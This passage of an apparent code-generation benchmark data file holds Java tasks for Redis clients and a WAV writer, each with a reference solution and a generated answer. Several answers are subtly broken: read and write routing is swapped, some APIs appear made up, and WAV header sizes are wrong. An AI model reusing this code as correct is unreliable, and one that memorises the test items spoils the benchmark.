    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.geometry.GeoCoordinate;\nimport io.lettuce.core.geometry.GeoRadiusArgs;\nimport io.lettuce.core.geometry.GeoUnit;\nimport io.lettuce.core.output.GeoWithin;\n\nimport java.util.List;\nimport java.util.Set;\n\npublic class RedisGeoOperations {\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        redisClient = RedisClient.create(\"redis://\" + host + \":\" + port);\n        StatefulRedisConnection<String, String> connection = redisClient.connect();\n        redisCommands = connection.sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, new GeoCoordinate(longitude, latitude), member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoUnit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoUnit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoUnit unit, GeoRadiusArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinate> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisClient.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Implement a Redis client class in Java that supports read-write operations with master-slave architecture, connection pooling, and proper resource management.\n\nClass Description: ReadWriteRedisClient is a Java class that provides a Redis client implementation with support for master-slave architecture. It uses connection pooling (via JedisPool) for efficient resource management and implements basic CRUD operations with automatic routing of read operations to slaves and write operations to the master.\n\nAttributes:\n- master: JedisPool - Connection pool for the master Redis instance\n- slaves: List<JedisPool> - List of connection pools for slave Redis instances\n- jedisPoolConfig: JedisPoolConfig - Configuration for the connection pools\n- address: String - Comma-separated list of Redis server addresses (master first)\n- timeout: int - Connection timeout in milliseconds\n- random: Random - Random number generator for slave selection\n\nMethods:\n- initialize() -> void - Initializes the Redis connection pools based on the configured addresses\n- destroy() -> void - Closes all connection pools and releases resources\n- get(String key) -> String - Retrieves a value from Redis (reads from a random slave)\n- set(String key, String value) -> String - Stores a value in Redis (writes to master)\n- fetchResource(boolean read) -> Jedis - Internal method to get a Redis connection (selects master or random slave)\n- setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) -> void - Sets the connection pool configuration\n- setTimeout(int timeout) -> void - Sets the connection timeout\n- setAddress(String address) -> void - Sets the Redis server addresses",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n\n    private JedisPool master;\n    private List<JedisPool> slaves = new ArrayList<JedisPool>();\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout = 3000;\n    private Random random = new Random();\n\n    public void initialize() throws Exception {\n        String[] hostAndPorts = address.split(\",\");\n        String masterHP = hostAndPorts[0];\n        String[] ms = masterHP.split(\":\");\n        master = new JedisPool(jedisPoolConfig, ms[0], Integer.valueOf(ms[1]), timeout);\n        if (hostAndPorts.length > 1) {\n            for (int i = 1; i < hostAndPorts.length; i++) {\n                String[] ss = hostAndPorts[i].split(\":\");\n                JedisPool slave = new JedisPool(jedisPoolConfig, ss[0], Integer.valueOf(ss[1]), timeout);\n                slaves.add(slave);\n            }\n        }\n        slaves.add(master);\n    }\n\n    public void destroy() throws Exception {\n        if (master != null) {\n            master.close();\n        }\n        for (JedisPool slave : slaves) {\n            if (slave != null) {\n                slave.close();\n            }\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if(slaves.isEmpty() || !read) {\n            return master.getResource();\n        }\n        int size = slaves.size();\n        int i = random.nextInt(size);\n        return slaves.get(i).getResource();\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n    private JedisPool master;\n    private List<JedisPool> slaves;\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout;\n    private Random random;\n\n    public void initialize() {\n        String[] servers = address.split(\",\");\n        this.master = new JedisPool(jedisPoolConfig, servers[0], timeout);\n        this.slaves = new ArrayList<>();\n        for (int i = 1; i < servers.length; i++) {\n            this.slaves.add(new JedisPool(jedisPoolConfig, servers[i], timeout));\n        }\n        this.random = new Random();\n    }\n\n    public void destroy() {\n        if (this.master != null) this.master.close();\n        for (JedisPool slave : this.slaves) {\n            if (slave != null) slave.close();\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.get(key);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if (read) {\n            JedisPool jedisPool = slaves.get(random.nextInt(slaves.size()));\n            return jedisPool.getResource();\n        } else {\n            return master.getResource();\n        }\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}\n```"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Implement a Java class for writing WAV audio files with support for file rollover when reaching maximum size limits, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: WaveWriter is a class that handles the creation and writing of WAV audio files. It manages file channels, buffers, and WAV file formatting while supporting automatic file rollover when files reach a specified maximum size. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- mAudioFormat: [AudioFormat] - The audio format specification for the WAV file\n- mFileRolloverCounter: [int] - Counter for tracking rolled-over file versions\n- mMaxSize: [long] - Maximum allowed file size before rollover (0 means no limit)\n- mFile: [Path] - Current file path being written to\n- mFileChannel: [FileChannel] - NIO file channel for file operations\n- mDataChunkOpen: [boolean] - Flag indicating if a data chunk is currently open\n- mDataChunkSizeOffset: [long] - File position of the data chunk size field\n- mDataChunkSize: [int] - Current size of the data chunk in bytes\n\nMethods:\n- WaveWriter: [constructor](AudioFormat format, Path file, long maxSize) -> [void] - Initializes a new WaveWriter with specified format, output file, and maximum size\n- WaveWriter: [constructor](AudioFormat format, Path file) -> [void] - Initializes a new WaveWriter with no maximum size limit\n- open: [private]() -> [void] - Opens a new file channel and writes initial WAV header\n- close: [public]() -> [void] - Closes the file channel and performs cleanup\n- close: [public](Path path) -> [void] - Closes the file channel and renames the file to the specified path\n- writeData: [public](ByteBuffer buffer) -> [void] - Writes audio data to the file, handling rollover if needed\n- closeDataChunk: [private]() -> [void] - Marks the current data chunk as closed\n- openDataChunk: [private]() -> [void] - Opens a new data chunk in the WAV file\n- rollover: [private]() -> [void] - Performs file rollover operation when reaching size limit\n- updateTotalSize: [private]() -> [void] - Updates the total file size in the WAV header\n- updateDataChunkSize: [private]() -> [void] - Updates the data chunk size in the WAV file\n- getUnsignedIntegerBuffer: [protected static](long size) -> [ByteBuffer] - Creates a buffer with unsigned integer representation\n- updateFileName: [private]() -> [void] - Updates the filename for rollover operations\n- getDataHeader: [public static]() -> [ByteBuffer] - Creates a data chunk header buffer\n- getWaveHeader: [public static](AudioFormat format) -> [ByteBuffer] - Creates a WAV file header buffer\n- getFormatChunk: [public static](AudioFormat format) -> [ByteBuffer] - Creates a format chunk buffer for WAV file",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.sound.sampled.AudioFormat;\n\npublic class WaveWriter implements AutoCloseable\n{\n    private static final Pattern FILENAME_PATTERN = Pattern.compile(\"(.*_)(\\\\d+)(\\\\.tmp)\");\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 1;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException\n    {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException\n    {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException\n    {\n        int version = 2;\n        while(Files.exists(mFile) && version < 20)\n        {\n            mFile = Paths.get(mFile.toFile().getAbsolutePath().replace(\".tmp\", \"_\" + version + \".tmp\"));\n            version++;\n        }\n        mFileChannel = (FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE_NEW));\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        while(header.hasRemaining())\n        {\n            mFileChannel.write(header);\n        }\n    }\n\n    public void close() throws IOException\n    {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException\n    {\n        mFileChannel.force(true);\n        mFileChannel.close();\n        rename(path);\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException\n    {\n        buffer.position(0);\n        openDataChunk();\n        if(mFileChannel.size() + buffer.capacity() < mMaxSize)\n        {\n            while(buffer.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(buffer);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n        else\n        {\n            int remaining = (int)(mMaxSize - mFileChannel.size());\n            remaining -= (int)(remaining % mAudioFormat.getFrameSize());\n            byte[] bytes = buffer.array();\n            ByteBuffer current = ByteBuffer.wrap(Arrays.copyOf(bytes, remaining));\n            ByteBuffer next = ByteBuffer.wrap(Arrays.copyOfRange(bytes, remaining, bytes.length));\n            while(current.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(current);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n            rollover();\n            openDataChunk();\n            while(next.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(next);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n    }\n\n    private void closeDataChunk()\n    {\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException\n    {\n        if(!mDataChunkOpen)\n        {\n            if(mFileChannel.size() + 32 >= mMaxSize)\n            {\n                rollover();\n            }\n            ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n            formatChunk.position(0);\n            while(formatChunk.hasRemaining())\n            {\n                mFileChannel.write(formatChunk);\n            }\n            ByteBuffer dataHeader = getDataHeader();\n            dataHeader.position(0);\n            while(dataHeader.hasRemaining())\n            {\n                mFileChannel.write(dataHeader);\n            }\n            mDataChunkSizeOffset = mFileChannel.size() - 4;\n            mDataChunkSize = 0;\n            mDataChunkOpen = true;\n            updateTotalSize();\n        }\n    }\n\n    private void rollover() throws IOException\n    {\n        closeDataChunk();\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException\n    {\n        ByteBuffer buffer = getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n        mFileChannel.write(buffer, 4);\n    }\n\n    private void updateDataChunkSize() throws IOException\n    {\n        ByteBuffer size = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(size, mDataChunkSizeOffset);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size)\n    {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.put((byte)(size & 0xFFl));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF00l, 8)));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF0000l, 16)));\n        buffer.put((byte)Long.rotateRight(Long.rotateRight(size & 0xFF000000l, 16), 8));\n        buffer.position(0);\n        return buffer;\n    }\n\n    private void updateFileName()\n    {\n        String filename = mFile.toString();\n        if(mFileRolloverCounter == 2)\n        {\n            filename = filename.replace(\".tmp\", \"_2.tmp\");\n        }\n        else\n        {\n            Matcher m = FILENAME_PATTERN.matcher(filename);\n            if(m.find())\n            {\n                StringBuilder sb = new StringBuilder();\n                sb.append(m.group(1));\n                sb.append(mFileRolloverCounter);\n                sb.append(m.group(3));\n                filename = sb.toString();\n            }\n        }\n        mFile = Paths.get(filename);\n    }\n\n    public static ByteBuffer getDataHeader()\n    {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put(DATA_CHUNK_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(RIFF_ID.getBytes());\n        header.putInt(INITIAL_TOTAL_LENGTH);\n        header.put(WAVE_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(FORMAT_CHUNK_ID.getBytes());\n        header.putInt(FORMAT_CHUNK_LENGTH);\n        header.putShort(FORMAT_UNCOMPRESSED_PCM);\n        header.putShort((short)format.getChannels());\n        header.putInt((int)format.getSampleRate());\n        int frameByteRate = format.getChannels() * format.getSampleSizeInBits() / 8;\n        int byteRate = (int)(format.getSampleRate() * frameByteRate);\n        header.putInt(byteRate);\n        header.putShort((short)frameByteRate);\n        header.putShort((short)format.getSampleSizeInBits());\n        header.position(0);\n        return header;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\n\npublic class WaveWriter implements AutoCloseable {\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 0;\n    private long mMaxSize = 0;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException {\n        this.mAudioFormat = format;\n        this.mFile = file;\n        this.mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException {\n        if (mFileChannel != null) {\n            mFileChannel.close();\n        }\n        mFileChannel = FileChannel.open(mFile, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.WRITE);\n        openDataChunk();\n        updateTotalSize();\n    }\n\n    @Override\n    public void close() throws IOException {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException {\n        if (mDataChunkOpen) {\n            closeDataChunk();\n        }\n        if (mFileChannel != null) {\n            mFileChannel.close();\n        }\n        if (path != null && !mFile.equals(path)) {\n            java.nio.file.Files.move(mFile, path);\n            mFile = path;\n        }\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException {\n        if (mMaxSize > 0 && mFileChannel.position() + buffer.remaining() > mMaxSize) {\n            rollover();\n        }\n        mFileChannel.write(buffer);\n        mDataChunkSize += buffer.remaining();\n        updateDataChunkSize();\n    }\n\n    private void closeDataChunk() throws IOException {\n        ByteBuffer header = getDataHeader();\n        header.putInt(mDataChunkSize);\n        mFileChannel.position(mDataChunkSizeOffset);\n        mFileChannel.write(header);\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException {\n        ByteBuffer header = getDataHeader();\n        mFileChannel.position(mFileChannel.size());\n        mFileChannel.write(header);\n        mDataChunkSizeOffset = mFileChannel.position();\n        mDataChunkSize = 0;\n        mDataChunkOpen = true;\n    }\n\n    private void rollover() throws IOException {\n        close();\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException {\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        header.putInt(4 + 8 + 16 + 8 + 8 + mDataChunkSize);\n        mFileChannel.position(0);\n        mFileChannel.write(header);\n    }\n\n    private void updateDataChunkSize() throws IOException {\n        if (!mDataChunkOpen) {\n            return;\n        }\n        ByteBuffer header = getDataHeader();\n        header.putInt(mDataChunkSize);\n        mFileChannel.position(mDataChunkSizeOffset);\n        mFileChannel.write(header);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size) {\n        ByteBuffer buffer = ByteBuffer.allocate((int) size);\n        buffer.order(java.nio.ByteOrder.LITTLE_ENDIAN);\n        return buffer;\n    }\n\n    private void updateFileName() {\n        String name = mFile.getFileName().toString();\n        int dotIndex = name.lastIndexOf('.');\n        if (dotIndex == -1) {\n            dotIndex = name.length();\n        }\n        name = name.substring(0, dotIndex) + \"_\" + ++mFileRolloverCounter + name.substring(dotIndex);\n        mFile = mFile.resolveSibling(name);\n    }\n\n    public static ByteBuffer getDataHeader() {\n        ByteBuffer buffer = ByteBuffer.allocate(8);\n        buffer.put((byte) 'd');\n        buffer.put((byte) 'a');\n        buffer.put((byte) 't');\n        buffer.put((byte) 'a');\n        buffer.putInt(0); // Placeholder for data size\n        return buffer;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(44);\n        buffer.put((byte) 'R');\n        buffer.put((byte) 'I');\n        buffer.put((byte) 'F');\n        buffer.put((byte) 'F');\n        buffer.putInt(36 + format.getSampleRate() * format.getChannels() * format.getSampleSizeInBits() / 8);\n        buffer.put((byte) 'W');\n        buffer.put((byte) 'A');\n        buffer.put((byte) 'V');\n        buffer.put((byte) 'E');\n        buffer.put((byte) 'f');\n        buffer.put((byte) 'm');\n        buffer.put((byte) 't');\n        buffer.put((byte) ' ');\n        buffer.putInt(16);\n        buffer.putShort((short) format.getChannels());\n        buffer.putInt(format.getSampleRate());\n        buffer.putInt(format.getSampleRate() * format.getChannels() * format.getSampleSizeInBits() / 8);\n        buffer.putShort((short) (format.getChannels() * format.getSampleSizeInBits() / 8));\n        buffer.putShort((short) format.getSampleSizeInBits());\n        buffer.put((byte) 'd');\n        buffer.put((byte) 'a');\n        buffer.put((byte) 't');\n        buffer.put((byte) 'a');\n        buffer.putInt(0); // Placeholder for data size\n        return buffer;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.put((byte) 'f');\n        buffer.put((byte) 'm');\n        buffer.put((byte) 't');\n        buffer.put((byte) ' ');\n        buffer.putInt(16);\n        buffer.putShort((short) format.getChannels());\n        buffer.putInt(format.getSampleRate());\n        buffer.putInt(format.getSampleRate() * format.getChannels() * format.getSampleSizeInBits() / 8);\n        buffer.putShort((short) (format.getChannels() * format.getSampleSizeInBits() / 8));\n        buffer.putShort((short) format.getSampleSizeInBits());\n        return buffer;\n    }\n}\n```"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, with support for read preference configuration.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave deployment, configure read preferences, and properly close connections. It uses Lettuce's MasterReplica API for high availability.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to Redis master-slave setup\n\nMethods:\n- connectToMasterSlave(String sentinelUrl) -> void - Establishes a connection to Redis master-slave setup using the provided sentinel URL and configures read preference to prefer master\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create();\n        connection = MasterReplica.connect(redisClient, StringCodec.UTF8, RedisURI.create(sentinelUrl));\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.masterreplica.MasterReplica;\n\npublic class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create(sentinelUrl);\n        connection = MasterReplica.connect(redisClient, \"master\");\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis JSON data structures using the Lettuce Redis client library. The class should handle connection management and provide methods for common JSON operations.\n\nClass Description: RedisJsonClient is a wrapper class for Lettuce Redis client that specializes in JSON operations. It manages Redis connections and provides synchronous methods to manipulate JSON data stored in Redis.\n\nAttributes:\n- client: RedisClient - The main Redis client instance for connection management\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisJsonClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- jsonGet(String key, JsonPath path) -> JsonValue - Retrieves JSON value at specified path from given key\n- jsonSet(String key, JsonPath path, JsonValue value) -> String - Sets JSON value at specified path for given key\n- jsonDel(String key, JsonPath path) -> Long - Deletes JSON value at specified path from given key\n- jsonArrlen(String key, JsonPath path) -> List<Long> - Gets length of JSON array at specified path\n- jsonArrpop(String key, JsonPath path) -> List<JsonValue> - Pops elements from JSON array at specified path\n- close() -> void - Shuts down the Redis connection and releases resources\n- createJsonValue(String value) -> JsonValue - Creates a new JsonValue from string\n- createJsonObject() -> JsonObject - Creates a new empty JsonObject\n- createJsonArray() -> JsonArray - Creates a new empty JsonArray",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.json.JsonParser;\nimport io.lettuce.core.json.JsonPath;\nimport io.lettuce.core.json.JsonValue;\n\npublic class RedisJsonClient {\n\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI redisURI = RedisURI.Builder.redis(host).withPort(port).build();\n        client = RedisClient.create(redisURI);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        List<JsonValue> values = syncCommands.jsonGet(key, path);\n        return values != null && !values.isEmpty() ? values.get(0) : null;\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path);\n    }\n\n    public void close() {\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return syncCommands.getJsonParser().createJsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return syncCommands.getJsonParser().createJsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return syncCommands.getJsonParser().createJsonArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.node.JsonNodeFactory;\n\npublic class RedisJsonClient {\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        client = RedisClient.create(\"redis://\" + host + \":\" + port);\n        StatefulRedisConnection<String, String> connection = client.connect();\n        syncCommands = connection.sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        return JsonValue.parse(syncCommands.jsonGet(key, path.toString()));\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path.toString(), value.toString());\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path.toString());\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return Arrays.stream(syncCommands.jsonArrlen(key, path.toString())).boxed().collect(Collectors.toList());\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return Arrays.stream(syncCommands.jsonArrpop(key, path.toString())).map(JsonValue::parse).collect(Collectors.toList());\n    }\n\n    public void close() {\n        client.shutdown();\n    }\n\n    public JsonValue createJsonValue(String value) {\n        ObjectMapper mapper = new ObjectMapper();\n        try {\n            JsonNode node = mapper.readTree(value);\n            return JsonValue.parse(node.toPrettyString());\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public JsonObject createJsonObject() {\n        return JsonNodeFactory.instance.objectNode();\n    }\n\n    public JsonArray createJsonArray() {\n        return JsonNodeFactory.instance.arrayNode();\n    }\n}\n```"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Java class that provides asynchronous Redis hash operations using the Lettuce client, including CRUD operations and field manipulation.\n\nClass Description: RedisHashInteraction is a utility class that encapsulates asynchronous Redis hash operations. It manages Redis connections and provides thread-safe methods for interacting with Redis hashes.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for creating connections\n- connection: StatefulRedisConnection<String, String> - The persistent connection to Redis\n- asyncCommands: RedisAsyncCommands<String, String> - The asynchronous command interface for Redis operations\n\nMethods:\n- Constructor(redisUri: String) -> void - Initializes the Redis client and establishes a connection using the provided URI\n- deleteKeys(keys: String...) -> CompletableFuture<Long> - Deletes one or more keys from Redis and returns the count of deleted keys\n- setHash(key: String, hash: Map<String, String>) -> CompletableFuture<Long> - Sets multiple hash fields at once for a given key\n- getHashField(key: String, field: String) -> CompletableFuture<String> - Retrieves the value of a specific field in a hash\n- getAllHashFields(key: String) -> CompletableFuture<Map<String, String>> - Retrieves all fields and values of a hash\n- incrementHashField(key: String, field: String, amount: long) -> CompletableFuture<Long> - Increments the integer value of a hash field by the given amount\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.asyncCommands = connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return asyncCommands.del(keys).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return asyncCommands.hset(key, hash).toCompletableFuture();\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return asyncCommands.hget(key, field).toCompletableFuture();\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return asyncCommands.hgetall(key).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return asyncCommands.hincrby(key, field, amount).toCompletableFuture();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    